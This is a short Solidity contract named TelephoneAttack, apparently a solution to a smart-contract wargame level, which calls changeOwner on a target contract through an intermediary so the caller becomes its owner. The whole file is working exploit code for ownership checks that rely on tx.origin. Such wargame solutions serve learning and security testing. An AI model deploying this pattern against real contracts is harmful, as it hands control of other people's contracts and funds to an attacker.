// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    ITelephone public challenge;

    constructor(address challengeAddress) {
        challenge = ITelephone(challengeAddress);
    }

    function attack() external {
        challenge.changeOwner(msg.sender);
    }
}
